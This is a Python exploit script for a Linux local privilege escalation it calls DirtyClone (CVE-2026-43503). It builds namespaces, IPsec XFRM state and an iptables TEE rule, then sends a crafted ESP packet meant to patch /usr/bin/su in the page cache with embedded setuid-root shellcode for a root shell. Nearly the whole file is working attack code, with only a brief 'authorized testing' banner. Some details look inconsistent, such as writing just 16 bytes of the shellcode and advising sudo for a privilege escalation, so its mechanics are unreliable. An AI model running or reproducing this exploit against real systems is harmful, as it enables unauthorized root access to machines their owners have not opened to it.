#!/usr/bin/env python3
"""
DirtyClone (CVE-2026-43503) - Python 3.5+ Compatible
"""

import os
import sys
import socket
import struct
import subprocess
import time
import mmap
import ctypes
import ctypes.util

# ====================================================================
# Constants
# ====================================================================

ESP_SPI = 0x12345678
ESP_REQID = 1
ESP_PORT = 4500
TARGET = "/usr/bin/su"
SUID_OFFSET = 0x78

# Payload: setuid(0) + execve("/bin/sh")
payload = bytes([
    0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
    0x0f, 0x05, 0xb0, 0x69, 0x0f, 0x05, 0x31, 0xd2,
    0x52, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f,
    0x73, 0x68, 0x00, 0x50, 0x48, 0x89, 0xe7, 0x52,
    0x57, 0x48, 0x89, 0xe6, 0xb8, 0x3b, 0x00, 0x00,
    0x00, 0x0f, 0x05,
])

# ====================================================================
# Colors
# ====================================================================

class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'

def log(msg):
    print(Colors.CYAN + "[*]" + Colors.RESET + " " + msg)

def ok(msg):
    print(Colors.GREEN + "[+]" + Colors.RESET + " " + msg)

def err(msg):
    print(Colors.RED + "[-]" + Colors.RESET + " " + msg)

def warn(msg):
    print(Colors.YELLOW + "[!]" + Colors.RESET + " " + msg)

# ====================================================================
# Pre-Checks
# ====================================================================

def precheck():
    log("Running pre-checks...")
    
    uname = os.uname()
    log("Kernel: {}".format(uname.release))
    
    # Check unprivileged user namespaces
    try:
        with open("/proc/sys/kernel/unprivileged_userns_clone", "r") as f:
            userns = f.read().strip()
            if userns == "1":
                ok("Unprivileged user namespaces: ENABLED")
            else:
                warn("Unprivileged user namespaces: DISABLED")
    except:
        warn("Cannot read unprivileged_userns_clone")
    
    # Check XFRM
    result = subprocess.run(["ip", "xfrm", "state"], 
                           stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    if "Operation not supported" in result.stderr.decode():
        warn("XFRM/IPsec: NOT AVAILABLE")
        return False
    else:
        ok("XFRM/IPsec: AVAILABLE")
    
    # Check target SUID
    if os.path.exists(TARGET):
        ok("Target: {} found".format(TARGET))
    else:
        err("Target: {} NOT found".format(TARGET))
        return False
    
    return True

# ====================================================================
# Namespace Setup
# ====================================================================

def setup_namespace():
    log("Setting up user and network namespace...")
    uid = os.getuid()
    gid = os.getgid()
    
    try:
        libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
        if libc.unshare(0x10000000 | 0x40000000) != 0:
            err("unshare failed")
            return False
    except Exception as e:
        err("unshare failed: {}".format(e))
        return False
    
    try:
        with open("/proc/self/setgroups", "w") as f:
            f.write("deny")
        with open("/proc/self/uid_map", "w") as f:
            f.write("0 {} 1".format(uid))
        with open("/proc/self/gid_map", "w") as f:
            f.write("0 {} 1".format(gid))
    except Exception as e:
        err("Map setup failed: {}".format(e))
        return False
    
    ok("Namespace setup complete")
    return True

# ====================================================================
# Network Setup
# ====================================================================

def setup_network():
    log("Configuring network...")
    
    # Load XFRM modules
    for mod in ["xfrm_user", "xfrm4_tunnel", "esp4"]:
        subprocess.call(["modprobe", mod], stderr=subprocess.DEVNULL)
    
    subprocess.call(["ip", "link", "set", "lo", "up"], stderr=subprocess.DEVNULL)
    subprocess.call(["ip", "addr", "add", "10.99.0.2/24", "dev", "lo"], 
                    stderr=subprocess.DEVNULL)
    
    return True

# ====================================================================
# XFRM Setup
# ====================================================================

def setup_xfrm():
    log("Configuring IPsec (XFRM)...")
    
    aes_key = bytes([0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
                     0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff])
    
    state_cmd = "ip xfrm state add src 127.0.0.1 dst 127.0.0.1 proto esp spi {} reqid {} mode transport enc 'cbc(aes)' {}".format(ESP_SPI, ESP_REQID, aes_key.hex())
    subprocess.call(state_cmd, shell=True, stderr=subprocess.DEVNULL)
    
    policy_cmd = "ip xfrm policy add src 127.0.0.1 dst 127.0.0.1 dir out tmpl src 127.0.0.1 dst 127.0.0.1 proto esp reqid {} mode transport".format(ESP_REQID)
    subprocess.call(policy_cmd, shell=True, stderr=subprocess.DEVNULL)
    
    ok("IPsec configured")
    return True

# ====================================================================
# TEE Setup
# ====================================================================

def setup_tee():
    log("Configuring netfilter TEE rule...")
    
    subprocess.call(["modprobe", "iptable_mangle"], stderr=subprocess.DEVNULL)
    subprocess.call(["modprobe", "ipt_TEE"], stderr=subprocess.DEVNULL)
    
    tee_cmd = "iptables -t mangle -A OUTPUT -p udp --dport {} -j TEE --gateway 10.99.0.2".format(ESP_PORT)
    subprocess.call(tee_cmd, shell=True, stderr=subprocess.DEVNULL)
    
    ok("TEE rule configured")
    return True

# ====================================================================
# Main Exploit
# ====================================================================

def exploit_dirtyclone():
    log("=" * 60)
    log("DirtyClone (CVE-2026-43503) Exploit")
    log("=" * 60)
    
    if os.geteuid() == 0:
        ok("Already root!")
        return True
    
    if not precheck():
        err("Pre-check failed")
        return False
    
    if not setup_namespace():
        return False
    
    if not setup_network():
        warn("Network setup partial")
    
    if not setup_xfrm():
        warn("XFRM setup failed")
    
    if not setup_tee():
        warn("TEE setup failed")
    
    # Map target
    if not os.path.exists(TARGET):
        err("Target not found")
        return False
    
    fd = os.open(TARGET, os.O_RDONLY)
    if fd < 0:
        err("Cannot open target")
        return False
    
    try:
        # Read original
        original = os.pread(fd, 16, SUID_OFFSET)
        log("Original: {}".format(original.hex()))
        
        # Prepare payload
        pld = payload[:16].ljust(16, b"\x00")
        log("Target:   {}".format(pld.hex()))
        
        # Send ESP packet
        iv = b"\x00" * 16
        esp_header = struct.pack("!II", ESP_SPI, 1) + iv
        esp_packet = esp_header + pld + b"\x00" * 16
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
        sock.sendto(esp_packet, ("127.0.0.1", ESP_PORT))
        sock.close()
        
        time.sleep(2)
        
        # Verify
        os.lseek(fd, SUID_OFFSET, os.SEEK_SET)
        patched = os.read(fd, 16)
        
        if patched == pld:
            ok("Page cache patched!")
            os.execv(TARGET, [TARGET])
            return True
        else:
            warn("Patch failed. Got: {}".format(patched.hex()))
            return False
            
    except Exception as e:
        err("Exploit error: {}".format(e))
        return False
    finally:
        os.close(fd)

# ====================================================================
# Main
# ====================================================================

def main():
    print("")
    print(Colors.BOLD + Colors.CYAN + "╔══════════════════════════════════════════════════════════════════╗" + Colors.RESET)
    print(Colors.BOLD + Colors.CYAN + "║     DirtyClone (CVE-2026-43503) Local Privilege Escalation       ║" + Colors.RESET)
    print(Colors.BOLD + Colors.CYAN + "║     For authorized security testing only!                        ║" + Colors.RESET)
    print(Colors.BOLD + Colors.CYAN + "╚══════════════════════════════════════════════════════════════════╝" + Colors.RESET)
    print("")
    
    log("UID: {}".format(os.getuid()))
    log("Kernel: {}".format(os.uname().release))
    
    if exploit_dirtyclone():
        ok("Exploit successful!")
    else:
        err("Exploit failed")
        log("\nPossible reasons:")
        log("  - Kernel already patched (>= v7.1-rc5)")
        log("  - XFRM/IPsec not enabled in kernel")
        log("  - Missing CAP_NET_ADMIN (run with sudo)")
        log("  - SELinux/AppArmor blocking the attack")
    
    return 1

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(1)